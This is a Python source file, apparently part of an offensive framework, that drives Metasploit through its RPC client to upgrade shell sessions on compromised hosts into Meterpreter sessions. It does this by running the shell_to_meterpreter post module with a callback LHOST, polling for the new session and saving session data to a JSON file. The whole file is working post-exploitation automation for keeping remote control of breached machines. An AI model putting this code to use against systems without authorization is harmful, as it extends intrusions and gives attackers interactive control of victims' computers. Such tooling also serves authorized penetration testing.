import json
import time
import logging
from typing import Any, Dict, List, Optional

from core.exceptions import (
    SpectraException,
    ExploitExecutionException,
    MSFRPCException,
)

logger = logging.getLogger("modules.post_exploit")


class PostExploitUnit:
    """
    Post-exploitation utilities (session upgrade, persistence, metadata).
    - msf_client is expected to be the underlying pymetasploit3 client object.
    """

    DEFAULT_UPGRADE_METHODS = [
        ("post", "multi/manage/shell_to_meterpreter"),
        ("post", "multi/manage/shell_to_meterpreter"),  # keep duplicate to allow different paths if desired
    ]

    def __init__(self, msf_client: Any, persist_sessions: bool = True, sessions_db: str = "sessions_db.json"):
        self.msf = msf_client
        self.persist_sessions = bool(persist_sessions)
        self.sessions_db = sessions_db

    def _session_exists(self, s_id: str) -> bool:
        try:
            return s_id in getattr(self.msf.sessions, "list", {}) or s_id in getattr(self.msf, "sessions", {}).keys()
        except Exception:
            # best effort
            try:
                return s_id in (getattr(self.msf, "sessions") or {}).keys()
            except Exception:
                return False

    def _get_session_info(self, s_id: str) -> Dict[str, Any]:
        try:
            # pymetasploit3: client.sessions.list is a dict mapping ids to info
            return getattr(self.msf.sessions, "list", {}).get(s_id) or {}
        except Exception:
            try:
                # fallback
                return (getattr(self.msf, "sessions") or {}).get(s_id, {})  # type: ignore
            except Exception:
                return {}

    def _wait_for_upgrade(self, s_id: str, timeout: int = 30, poll_interval: float = 2.0) -> Dict[str, Any]:
        """
        Wait until the session type changes or new session appears (best-effort). Returns final session info.
        """
        start = time.time()
        initial = self._get_session_info(s_id)
        initial_type = initial.get("type")
        logger.debug("Initial session %s type=%s; waiting up to %ds for upgrade", s_id, initial_type, timeout)

        while time.time() - start < timeout:
            try:
                info = self._get_session_info(s_id)
                if not info:
                    # session may have been replaced by new session id; scan for meterpreter sessions
                    sessions_map = getattr(self.msf.sessions, "list", {}) or {}
                    for sid, sinfo in sessions_map.items():
                        if sid != s_id and sinfo.get("host") == initial.get("host") and sinfo.get("type") and sinfo.get("type") != initial_type:
                            logger.debug("Detected potential replacement session %s type=%s", sid, sinfo.get("type"))
                            return {"session_id": sid, "info": sinfo}
                    time.sleep(poll_interval)
                    continue
                # if type changed, success
                if info.get("type") != initial_type:
                    logger.info("Session %s type changed from %s to %s", s_id, initial_type, info.get("type"))
                    return {"session_id": s_id, "info": info}
            except Exception:
                logger.debug("Error while polling session info for %s", s_id, exc_info=True)
            time.sleep(poll_interval)

        # timed out
        logger.debug("Timeout waiting for session %s upgrade", s_id)
        return {"session_id": s_id, "info": self._get_session_info(s_id)}

    def _persist_session(self, s_id: str, info: Dict[str, Any]) -> None:
        if not self.persist_sessions:
            return
        try:
            try:
                with open(self.sessions_db, "r", encoding="utf-8") as f:
                    db = json.load(f)
            except Exception:
                db = {}
            db[str(s_id)] = info
            with open(self.sessions_db, "w", encoding="utf-8") as f:
                json.dump(db, f, indent=2)
            logger.debug("Persisted session %s to %s", s_id, self.sessions_db)
        except Exception:
            logger.warning("Failed to persist session %s", s_id, exc_info=True)

    def upgrade_shell(
        self,
        s_id: str,
        lhost: str,
        methods: Optional[List[tuple]] = None,
        timeout: int = 30,
        poll_interval: float = 2.0,
        retries: int = 1,
    ) -> Dict[str, Any]:
        """
        Attempt to upgrade a plain shell session to a more capable session (e.g., meterpreter).

        Returns a structured dict:
        {
          "status": "success"|"failure"|"partial",
          "reason": "<short_code>",
          "details": {...}
        }

        Raises ExploitExecutionException on fatal internal issues.
        """
        if not s_id:
            raise ExploitExecutionException("No session id provided to upgrade_shell", details={"session_id": s_id})

        if not self._session_exists(s_id):
            logger.error("Session %s not found", s_id)
            return {"status": "failure", "reason": "session_not_found", "details": {"session_id": s_id}}

        methods = methods or self.DEFAULT_UPGRADE_METHODS

        last_error = None
        for method in methods:
            mtype, mpath = method
            for attempt in range(max(1, retries)):
                try:
                    logger.info("Trying upgrade method %s/%s for session %s (attempt %d)", mtype, mpath, s_id, attempt + 1)
                    try:
                        module = self.msf.modules.use(mtype, mpath)
                    except Exception as e:
                        logger.debug("Failed to load module %s/%s: %s", mtype, mpath, e, exc_info=True)
                        last_error = e
                        continue

                    # set common parameters
                    try:
                        module["SESSION"] = s_id
                        module["LHOST"] = lhost
                    except Exception:
                        try:
                            setattr(module, "SESSION", s_id)
                            setattr(module, "LHOST", lhost)
                        except Exception:
                            logger.debug("Failed to set SESSION/LHOST on module %s/%s", mtype, mpath, exc_info=True)

                    # allow modules to run
                    logger.debug("Executing post module %s/%s for session %s", mtype, mpath, s_id)
                    try:
                        res = module.execute()
                    except Exception as e:
                        logger.warning("Module execute failed: %s", e, exc_info=True)
                        last_error = e
                        continue

                    # best-effort: check result content
                    text = str(res)
                    logger.debug("Module execution result: %s", text)

                    # wait for upgrade effect (type change / new session)
                    result = self._wait_for_upgrade(s_id, timeout=timeout, poll_interval=poll_interval)
                    final_info = result.get("info", {})
                    final_sid = result.get("session_id", s_id)

                    if final_info and final_info.get("type") and final_info.get("type") != self._get_session_info(s_id).get("type"):
                        # success
                        logger.info("Upgrade successful for session %s -> type=%s", final_sid, final_info.get("type"))
                        self._persist_session(final_sid, final_info)
                        return {"status": "success", "reason": "upgraded", "details": {"session_id": final_sid, "type": final_info.get("type"), "module_result": text}}
                    else:
                        # If we detect meterpreter present in res text, treat as success
                        if "meterpreter" in text.lower() or "session upgraded" in text.lower():
                            logger.info("Module reported success text for session %s", s_id)
                            self._persist_session(s_id, final_info or {})
                            return {"status": "success", "reason": "upgraded_by_module_output", "details": {"session_id": s_id, "module_result": text}}

                        # otherwise treat as partial/failure for this method and try next
                        logger.debug("Module did not produce upgrade for session %s (result=%s)", s_id, text)
                        last_error = text
                        continue

                except Exception as e:
                    logger.exception("Unexpected error during upgrade attempt for session %s", s_id)
                    last_error = e
                    continue

        # all methods exhausted
        logger.error("All upgrade methods exhausted for session %s; last error: %s", s_id, last_error)
        return {"status": "failure", "reason": "upgrade_failed", "details": {"session_id": s_id, "last_error": str(last_error)}}

    # Backwards-compatible alias for older callers
    def upgrade(self, *args, **kwargs):
        return self.upgrade_shell(*args, **kwargs)
